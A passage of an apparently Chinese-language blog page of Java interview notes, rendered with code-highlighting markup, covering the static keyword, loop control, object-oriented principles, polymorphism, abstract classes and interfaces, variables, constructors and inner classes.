的主要意义是在于创建独立于具体对象的域变量或者方法。以致于即使没有创建对象，也能使用属性和调用方法！</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">static</span> 关键字还有一个比较关键的作用就是 用来形成静态代码块以优化程序性能。<span class="keyword">static</span> 块可以置于类中的任何地方，类中可以有多个 <span class="keyword">static</span> 块。在类初次被加载的时候，会按照 <span class="keyword">static</span> 块的顺序来执行每个 <span class="keyword">static</span> 块，并且只会执行一次。</span><br><span class="line">                </span><br><span class="line">• 为什么说<span class="keyword">static</span>块可以用来优化程序性能，是因为它的特性:只会在类加载的时候执行一次。因此很多时候会将一些只需要进行一次的初始化操作都放<span class="keyword">static</span>代码块中进行。</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">I. <span class="keyword">static</span> 的独特之处</span><br><span class="line">• 被 <span class="keyword">static</span> 修饰的变量或者方法是独立于该类的任何对象，也就是说这些变量和方法不属于任何一个实例对象，而是被类的实例对象所共享。怎么理解 “被类的实例对象所共享” 这句话呢？就是说，一个类的静态成员，它是属于大伙的【大伙指的是这个类的多个对象实例，我们都知道一个类可以创建多个实例！】，所有的类对象共享的，不像成员变量是自个的【自个指的是这个类的单个实例对象】</span><br><span class="line">                </span><br><span class="line">• 在该类被第一次加载的时候，就会去加载被<span class="keyword">static</span>修饰的部分，而且只在类第一次使用时加载并进行初始化，注意这是第一次用就要初始化，后面根据需是可以再次赋值的</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">static</span> 变量值在类加载的时候分配空间，以后创建类对象的时候不会重新分配。赋值的话是可以任意赋值的</span><br><span class="line">                </span><br><span class="line">• 被 <span class="keyword">static</span> 修饰的变量或者方法是优先于对象存在的，也就是说当一个类加载完毕之后，即便没有创建对象，也可以去访问。</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">J. <span class="keyword">static</span> 应用场景</span><br><span class="line">• 因为 <span class="keyword">static</span> 是被类的实例对象所共享，因此如果某个成员变量是被所有对象所共享的，那么这个成员变量就应该定义为静态变量。       </span><br><span class="line">• 因此比较常见的 <span class="keyword">static</span> 应用场景有：</span><br><span class="line"><span class="number">1</span>、修饰成员变量 </span><br><span class="line">    <span class="number">2</span>、修饰成员方法 </span><br><span class="line">    <span class="number">3</span>、静态代码块 </span><br><span class="line">    <span class="number">4</span>、修饰类【只能修饰内部类也就是静态内部类】 </span><br><span class="line">    <span class="number">5</span>、静态导包</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">K. <span class="keyword">static</span> 注意事项</span><br><span class="line">• 静态只能访问静态。 </span><br><span class="line">• 非静态既可以访问非静态的，也可以访问静态的。</span><br></pre></td></tr></table></figure><h2 id="7、流程控制语句"><a href="#7、流程控制语句" class="headerlink" title="7、流程控制语句"></a>7、流程控制语句</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">A. <span class="keyword">break</span> ,<span class="keyword">continue</span> ,<span class="keyword">return</span> 的区别及作用</span><br><span class="line">• <span class="keyword">break</span> 跳出总上一层循环，不再执行循环(结束当前的循环体)</span><br><span class="line">    • <span class="keyword">continue</span> 跳出本次循环，继续执行下次循环(结束正在执行的循环 进入下一个循环条件)</span><br><span class="line">    • <span class="keyword">return</span> 程序返回，不再执行下面的代码(结束当前的方法 直接返回)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">B. 在 Java 中，如何跳出当前的多重嵌套循环</span><br><span class="line">    • 在 Java 中，要想跳出多重循环，可以在外面的循环语句前定义一个标号，然后在里层循环体的代码中使用带有标号的 <span class="keyword">break</span> 语句，即可跳出外层循环。例如：</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[]args)</span></span>&#123;</span><br><span class="line">            ok:</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i + <span class="string">&quot;,j=&quot;</span> + j);</span><br><span class="line">                    <span class="keyword">if</span> (j == <span class="number">5</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span> ok;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="gt-面向对象"><a href="#gt-面向对象" class="headerlink" title="&gt; 面向对象"></a>&gt; 面向对象</h1><h2 id="1、面向对象概述"><a href="#1、面向对象概述" class="headerlink" title="1、面向对象概述"></a>1、面向对象概述</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">面向对象和面向过程的区别</span><br><span class="line">    </span><br><span class="line">面向过程：</span><br><span class="line">• 优点：性能比面向对象高，因为类调用时需要实例化，开销比较大，比较消耗资源;比如单片机、嵌入式开发、Linux/Unix 等一般采用面向过程开发，性能是最重要的因素。</span><br><span class="line">    </span><br><span class="line">• 缺点：没有面向对象易维护、易复用、易扩展</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">面向对象：</span><br><span class="line">• 优点：易维护、易复用、易扩展，由于面向对象有封装、继承、多态性的特性，可以设计出低耦合的系统，使系统更加灵活、更加易于维护</span><br><span class="line">    </span><br><span class="line">• 缺点：性能比面向过程低</span><br><span class="line">   </span><br><span class="line">• 面向过程是具体化的，流程化的，解决一个问题，你需要一步一步的分析，一步一步的实现。</span><br><span class="line">    </span><br><span class="line">• 面向对象是模型化的，你只需抽象出一个类，这是一个封闭的盒子，在这里你拥有数据也拥有解决问题的方法。需要什么功能直接使用就可以了，不必去一步一步的实现。</span><br><span class="line">    </span><br><span class="line">• 面向对象的底层其实还是面向过程，把面向过程抽象成类，然后封装，方便我们使用的就是面向对象了。</span><br></pre></td></tr></table></figure><h2 id="2、面向对象三大特性"><a href="#2、面向对象三大特性" class="headerlink" title="2、面向对象三大特性"></a>2、面向对象三大特性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Java面向对象编程三大特性：封装 继承 多态</span><br><span class="line">    </span><br><span class="line">面向对象的特征主要有以下几个方面：</span><br><span class="line"></span><br><span class="line">A. 抽象：</span><br><span class="line">    <span class="number">1.</span> 抽象是将一类对象的共同特征总结出来构造类的过程，包括数据抽象和行</span><br><span class="line">    <span class="number">2.</span> 为抽象两方面。抽象只关注对象有哪些属性和行为，并不关注这些行为的细节是什么。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">B. 封装</span><br><span class="line"><span class="number">1.</span> 封装把一个对象的属性私有化，同时提供一些可以被外界访问的属性的方法，如果属性不想被外界访问，我们大可不必提供方法给外界访问。</span><br><span class="line">    <span class="number">2.</span> 但是如果一个类没有提供给外界访问的方法，那么这个类也没有什么意义了。</span><br><span class="line">    <span class="number">3.</span> 隐藏对象的属性和实现细节，仅对外提供公共访问方式，将变化隔离，便于使用，提高复用性和安全性。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">C. 继承</span><br><span class="line"><span class="number">1.</span> 继承是使用已存在的类的定义作为基础建立新类的技术，新类的定义可以增加新的数据或新的功能，也可以用父类的功能，但不能选择性地继承父类。</span><br><span class="line">    <span class="number">2.</span> 通过使用继承我们能够非常方便地复用以前的代码,可以提高代码复用性。继承是多态的前提。</span><br><span class="line"><span class="number">3.</span> 关于继承如下 <span class="number">3</span> 点请记住：</span><br><span class="line">•  子类拥有父类非 <span class="keyword">private</span> 的属性和方法。</span><br><span class="line">• 子类可以拥有自己属性和方法，即子类可以对父类进行扩展。</span><br><span class="line">•  子类可以用自己的方式实现父类的方法。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">D. 多态：</span><br><span class="line"><span class="number">1.</span> 多态就是指程序中定义的引用变量所指向的具体类型和通过该引用变量发出的方法调用在编程时并不确定，而是在程序运行期间才确定，即一个引用变量到底会指向哪个类的实例对象，该引用变量发出的方法调用到底是哪个类中实现的方法，必须在由程序运行期间才能决定。</span><br><span class="line">    <span class="number">2.</span> 在Java中有两种形式可以实现多态：</span><br><span class="line">    • 继承（多个子类对同一方法的重写) </span><br><span class="line">    • 接口(实现接口并覆盖接口中同一方法）</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">E. 多态性：</span><br><span class="line">      <span class="number">1.</span> 父类或接口定义的引用变量可以指向子类或具体实现类的实例对象。提高了程序的拓展性。</span><br><span class="line">      <span class="number">2.</span> 方法重载（overload）实现的是编译时的多态性（也称为前绑定），而方法重写（override）实现的是运行时的多态性（也称为后绑定）。</span><br><span class="line">      <span class="number">3.</span> 一个引用变量到底会指向哪个类的实例对象，该引用变量发出的方法调用到底是哪个类中实现的方法，必须在由程序运行期间才能决定。运行时的多态是面向对象最精髓的东西，要实现多态需要做两件事：  </span><br><span class="line">• 方法重写（子类继承父类并重写父类中已有的或抽象的方法）；</span><br><span class="line">• 对象造型（用父类型引用子类型对象，这样同样的引用调用同样的方法就会根据子类对象的不同而表现出不同的行为）。 </span><br></pre></td></tr></table></figure><h2 id="3、什么是多态机制？Java-语言是如何实现多态的？"><a href="#3、什么是多态机制？Java-语言是如何实现多态的？" class="headerlink" title="3、什么是多态机制？Java 语言是如何实现多态的？"></a>3、什么是多态机制？Java 语言是如何实现多态的？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">因为在程序运行时才确定具体的类，这样不用修改源程序代码，就可以让引用变量绑定到各种不同的类实现上，从而导致该引用调用的具体方法随之改变，即不修改程序代码就可以改变程序运行时所绑定的具体代码，让程序可以选择多个运行状态，这就是多态性。多态分为编译时多态和运行时多态。其中编辑时多态是静态的，主要是指方法的重载，它是根据参数列表的不同来区分不同的函数，通过编辑之后会变成两个不同的函数，在运行时谈不上多态。而运行时多态是动态的，它是通过动态绑定来实现的，也就是我们所说的多态性。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">多态的实现</span><br><span class="line">Java 实现多态有三个必要条件：继承、重写、向上转型。</span><br><span class="line">    </span><br><span class="line"><span class="number">1.</span> 继承：在多态中必须存在有继承关系的子类和父类。</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span> 重写：子类对父类中某些方法进行重新定义，在调用这些方法时就会调用子类的方法。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span> 向上转型：在多态中需要将子类的引用赋给父类对象，只有这样该引用才能够具备技能调用父类的方法和子类的方法。</span><br><span class="line">    </span><br><span class="line">只有满足了上述三个条件，我们才能够在同一个继承结构中使用统一的逻辑实现代码处理不同的对象，从而达到执行不同的行为。</span><br><span class="line">对于 Java 而言，它多态的实现机制遵循一个原则：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。</span><br></pre></td></tr></table></figure><h2 id="4、面向对象五大基本原则是什么（选择看"><a href="#4、面向对象五大基本原则是什么（选择看" class="headerlink" title="4、面向对象五大基本原则是什么（选择看)"></a>4、面向对象五大基本原则是什么（选择看)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">• 单一职责原则 SRP(Single Responsibility Principle)类的功能要单一，不能包罗万象，跟杂货铺似的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">• 开放封闭原则 OCP(Open－Close Principle)一个模块对于拓展是开放的，对于修改是封闭的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">• 里式替换原则 LSP(the Liskov Substitution Principle LSP)子类可以替换父类出现在父类能够出现的任何地方。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">• 依赖倒置原则 DIP(the Dependency Inversion Principle DIP)高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。抽象不应该依赖于具体实现，具体实现应该依赖于抽象。就是你出国要说你是中国人，而不能说你是哪个村子的。比如说中国人是抽象的，下面有具体的 xx 省，xx 市，xx 县。你要依赖的抽象是中国人，而不是你是 xx 村的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">• 接口分离原则 ISP(the Interface Segregation Principle ISP)设计时采用多个与特定客户类有关的接口比采用一个通用的接口要好。就比如一个手机拥有打电话，看视频，玩游戏等功能，把这几个功能拆分成不同的接口，比在一个接口里要好的多。</span><br></pre></td></tr></table></figure><h1 id="gt-类与接口"><a href="#gt-类与接口" class="headerlink" title="&gt; 类与接口"></a>&gt; 类与接口</h1><h2 id="1、抽象类和接口的对比"><a href="#1、抽象类和接口的对比" class="headerlink" title="1、抽象类和接口的对比"></a>1、抽象类和接口的对比</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">抽象类是用来捕捉子类的通用特性的。</span><br><span class="line">接口是抽象方法的集合。从设计层面来说，抽象类是对类的抽象，是一种模板设计，接口是行为的抽象，是一种行为的规范。</span><br></pre></td></tr></table></figure><h2 id="2、相同点和不同点"><a href="#2、相同点和不同点" class="headerlink" title="2、相同点和不同点"></a>2、相同点和不同点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相同点</span><br><span class="line">• 接口和抽象类都不能实例化</span><br><span class="line">• 都位于继承的顶端，用于被其他实现或继承</span><br><span class="line">• 都包含抽象方法，其子类都必须覆写这些抽象方法</span><br><span class="line"></span><br><span class="line">不同点</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/63b994a3be43e0d30e9add98.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">备注：Java8 中接口中引入默认方法和静态方法，以此来减少抽象类和接口之间的差异。</span><br><span class="line">现在，我们可以为接口提供默认实现的方法了，并且不用强制子类来实现它。接口和抽象类各有优缺点，在接口和抽象类的选择上，必须遵守这样一个原则：</span><br><span class="line">• 行为模型应该总是通过接口而不是抽象类定义，所以通常是优先选用接口，尽量少用抽象类。</span><br><span class="line">• 选择抽象类的时候通常是如下情况：需要定义子类的行为，又要为子类提供通用的功能。</span><br></pre></td></tr></table></figure><h2 id="3、普通类和抽象类有哪些区别？"><a href="#3、普通类和抽象类有哪些区别？" class="headerlink" title="3、普通类和抽象类有哪些区别？"></a>3、普通类和抽象类有哪些区别？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 普通类不能包含抽象方法，抽象类可以包含抽象方法。</span><br><span class="line">2. 抽象类不能直接实例化，普通类可以直接实例化。</span><br></pre></td></tr></table></figure><h2 id="4、抽象类能使用-final-修饰吗？"><a href="#4、抽象类能使用-final-修饰吗？" class="headerlink" title="4、抽象类能使用 final 修饰吗？"></a>4、抽象类能使用 final 修饰吗？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能，定义抽象类就是让其他类继承的，如果定义为 final 该类就不能被继承，这样彼此就会产生矛盾，所以 final 不能修饰抽象类</span><br></pre></td></tr></table></figure><h2 id="5、创建一个对象用什么关键字？对象实例与对象引用有何不同？"><a href="#5、创建一个对象用什么关键字？对象实例与对象引用有何不同？" class="headerlink" title="5、创建一个对象用什么关键字？对象实例与对象引用有何不同？"></a>5、创建一个对象用什么关键字？对象实例与对象引用有何不同？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. new 关键字，new 创建对象实例（对象实例在堆内存中），对象引用指向对象实例（对象引用存放在栈内存中）。</span><br><span class="line">2. 一个对象引用可以指向 0 个或 1 个对象（一根绳子可以不系气球，也可以系一个气球）;一个对象可以有 n 个引用指向它（可以用 n 条绳子系住一个气球）</span><br></pre></td></tr></table></figure><h1 id="gt-变量与方法"><a href="#gt-变量与方法" class="headerlink" title="&gt; 变量与方法"></a>&gt; 变量与方法</h1><h2 id="1、成员变量与局部变量的区别有哪些？"><a href="#1、成员变量与局部变量的区别有哪些？" class="headerlink" title="1、成员变量与局部变量的区别有哪些？"></a>1、成员变量与局部变量的区别有哪些？</h2><ul><li><p>变量：在程序执行的过程中，在某个范围内其值可以发生改变的量。从本质上讲，变量其实是内存中的一小块区域</p></li><li><p>成员变量：方法外部，类内部定义的变量</p></li><li><p>局部变量：类的方法中的变量。</p></li></ul><h2 id="2、成员变量和局部变量的区别？"><a href="#2、成员变量和局部变量的区别？" class="headerlink" title="2、成员变量和局部变量的区别？"></a>2、成员变量和局部变量的区别？</h2><ul><li><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3></li></ul><p>​        成员变量：针对整个类有效。</p><p>​        局部变量：只在某个范围内有效。(一般指的就是方法,语句体内)</p><ul><li><h3 id="存储位置"><a href="#存储位置" class="headerlink" title="存储位置"></a>存储位置</h3></li></ul><p>​        成员变量：随着对象的创建而存在，随着对象的消失而消失，存储在堆内存中。</p><p>​        局部变量：在方法被调用，或者语句被执行的时候存在，存储在栈内存中。当方法调用完，或者语句结束后，就自动释放。</p><ul><li><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3></li></ul><p>​        成员变量：随着对象的创建而存在，随着对象的消失而消失。</p><p>​        局部变量：当方法调用完，或者语句结束后，就自动释放。</p><ul><li><h3 id="初始值"><a href="#初始值" class="headerlink" title="初始值"></a>初始值</h3><p>成员变量：有默认初始值。</p><p>局部变量：没有默认初始值，使用前必须赋值。</p><p>在使用变量时需要遵循的原则为：就近原则。首先在局部范围找，有就使用；接着在成员位置找。</p></li></ul><h2 id="3、在-Java-中定义一个不做事且没有参数的构造方法的作用"><a href="#3、在-Java-中定义一个不做事且没有参数的构造方法的作用" class="headerlink" title="3、在 Java 中定义一个不做事且没有参数的构造方法的作用?"></a>3、在 Java 中定义一个不做事且没有参数的构造方法的作用?</h2><ul><li><p>Java 程序在执行子类的构造方法之前，如果没有用 super()来调用父类特定的构造方法，则会调用父类中“没有参数的构造方法”。</p></li><li><p>如果父类中只定义了有参数的构造方法，而在子类的构造方法中又没有用 super()来调用父类中特定的构造方法，则编译时将发生错误，因为 Java 程序在父类中找不到没有参数的构造方法可供执行。</p></li><li><p>解决办法是在父类里加上一个不做事且没有参数的构造方法。</p></li></ul><h2 id="4、在调用子类构造方法之前会先调用父类没有参数的构造方法，其目的是？"><a href="#4、在调用子类构造方法之前会先调用父类没有参数的构造方法，其目的是？" class="headerlink" title="4、在调用子类构造方法之前会先调用父类没有参数的构造方法，其目的是？"></a>4、在调用子类构造方法之前会先调用父类没有参数的构造方法，其目的是？</h2><ul><li>帮助子类做初始化工作。</li></ul><h2 id="5、一个类的构造方法的作用是什么？若一个类没有声明构造方法，改程序能正确执行吗？为什么？"><a href="#5、一个类的构造方法的作用是什么？若一个类没有声明构造方法，改程序能正确执行吗？为什么？" class="headerlink" title="5、一个类的构造方法的作用是什么？若一个类没有声明构造方法，改程序能正确执行吗？为什么？"></a>5、一个类的构造方法的作用是什么？若一个类没有声明构造方法，改程序能正确执行吗？为什么？</h2><ul><li>主要作用是完成对类对象的初始化工作。</li><li>若一个类没有声明构造方法，改程序可以正确执行。</li><li>因为一个类即使没有声明构造方法也会有默认的不带参数的构造方法。（无参构造）</li></ul><h2 id="6、构造方法有哪些特性？"><a href="#6、构造方法有哪些特性？" class="headerlink" title="6、构造方法有哪些特性？"></a>6、构造方法有哪些特性？</h2><ul><li>名字与类名相同；</li><li>没有返回值，但不能用 void 声明构造函数；</li><li>生成类的对象时自动执行，无需调用。</li></ul><h2 id="7、静态变量和实例变量区别？"><a href="#7、静态变量和实例变量区别？" class="headerlink" title="7、静态变量和实例变量区别？"></a>7、静态变量和实例变量区别？</h2><ul><li><p>静态变量： 静态变量由于不属于任何实例对象，属于类的，所以在内存中只会有一份，在类的加载过程中，JVM 只为静态变量分配一次内存空间。</p></li><li><p>实例变量： 每次创建对象，都会为每个对象分配成员变量内存空间，实例变量是属于实例对象的，在内存中，创建几次对象，就有几份成员变量。</p></li></ul><h2 id="8、静态变量与普通变量-非静态变量-区别？"><a href="#8、静态变量与普通变量-非静态变量-区别？" class="headerlink" title="8、静态变量与普通变量(非静态变量)区别？"></a>8、静态变量与普通变量(非静态变量)区别？</h2><ul><li>static 变量也称作静态变量，静态变量和非静态变量的区别是：静态变量被所有的对象所共享，在内存中只有一个副本，它当且仅当在类初次加载时会被初始化。</li><li>而非静态变量是对象所拥有的，在创建对象的时候被初始化，存在多个副本，各个对象拥有的副本互不影响。</li><li>还有一点就是 static 成员变量的初始化顺序按照定义的顺序进行初始化。</li></ul><h2 id="9、静态方法和实例方法有何不同？"><a href="#9、静态方法和实例方法有何不同？" class="headerlink" title="9、静态方法和实例方法有何不同？"></a>9、静态方法和实例方法有何不同？</h2><ul><li><p>在外部调用静态方法时，可以使用”类名.方法名”的方式，也可以使用”对象名.方法名”的方式。而实例方法只有后面这种方式。也就是说调用静态方法可以无需创建对象。</p></li><li><p>静态方法在访问本类的成员时，只允许访问静态成员（即静态成员变量和静态方法），而不允许访问实例成员变量和实例方法，实例方法则无此限制。</p></li></ul><h2 id="10、在一个静态方法内调用一个非静态成员为什么是非法的？"><a href="#10、在一个静态方法内调用一个非静态成员为什么是非法的？" class="headerlink" title="10、在一个静态方法内调用一个非静态成员为什么是非法的？"></a>10、在一个静态方法内调用一个非静态成员为什么是非法的？</h2><ul><li>由于静态方法可以不通过对象进行调用，因此在静态方法里，不能调用其他非静态变量，也不可以访问非静态变量成员。内部类的分类有哪些</li></ul><h2 id="11、什么是方法的返回值？返回值的作用是什么？"><a href="#11、什么是方法的返回值？返回值的作用是什么？" class="headerlink" title="11、什么是方法的返回值？返回值的作用是什么？"></a>11、什么是方法的返回值？返回值的作用是什么？</h2><ul><li>方法的返回值是指我们获取到的某个方法体中的代码执行后产生的结果！（前提是该方法可能产生结果）。</li><li>返回值的作用: 接收出结果，使得它可以用于其他的操作。</li></ul><h1 id="gt-内部类"><a href="#gt-内部类" class="headerlink" title="&gt; 内部类"></a>&gt; 内部类</h1><h2 id="1、什么是内部类？"><a href="#1、什么是内部类？" class="headerlink" title="1、什么是内部类？"></a>1、什么是内部类？</h2><ul><li>在 Java 中，可以将一个类的定义放在另外一个类的定义内部，这就是内部类。内部类本身就是类的一个属性，与其他属性定义方式一致。</li></ul><h2 id="2、内部类的分类有哪些？"><a href="#2、内部类的分类有哪些？" class="headerlink" title="2、内部类的分类有哪些？"></a>2、内部类的分类有哪些？</h2><ul><li>内部类可以分为四种：成员内部类、局部内部类、匿名内部类、静态内部类。</li></ul><h2 id="3、静态内部类"><a href="#3、静态内部类" class="headerlink" title="3、静态内部类"></a>3、静态内部类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">定义在类内部的静态类，就是静态内部类。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> radius = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInner</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;visit outer static variable:&quot;</span> + radius);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">静态内部类可以访问外部类所有的静态变量，而不可访问外部类的非静态变量；</span><br><span class="line">静态内部类的创建方式，<span class="keyword">new</span> 外部类.静态内部类()，如下：</span><br><span class="line">Outer.StaticInner inner=<span class="keyword">new</span> Outer.StaticInner();</span><br><span class="line">inner.visit();</span><br></pre></td></tr></table></figure><h2 id="4、成员内部类"><a href="#4、成员内部类" class="headerlink" title="4、成员内部类"></a>4、成员内部类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">定义在类内部，成员位置上的非静态类，就是成员内部类。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> radius = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">2</span>; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;visit outer static  variable:&quot;</span> + radius);</span><br><span class="line">            System.out.println(<span class="string">&quot;visit outer   variable:&quot;</span> + count);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">成员内部类可以访问外部类所有的变量和方法，包括静态和非静态，私有和公有。</span><br><span class="line">成员内部类依赖于外部类的实例，它的创建方式外部类实例.new 内部类()，如下：</span><br><span class="line">Outer outer=<span class="keyword">new</span> Outer();</span><br><span class="line">Outer.Inner inner=outer.n<span class="function">ew <span class="title">Inner</span><span class="params">()</span></span>;</span><br><span class="line">inner.visit();</span><br></pre></td></tr></table></figure><h2 id="5、局部内部类"><a href="#5、局部内部类" class="headerlink" title="5、局部内部类"></a>5、局部内部类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 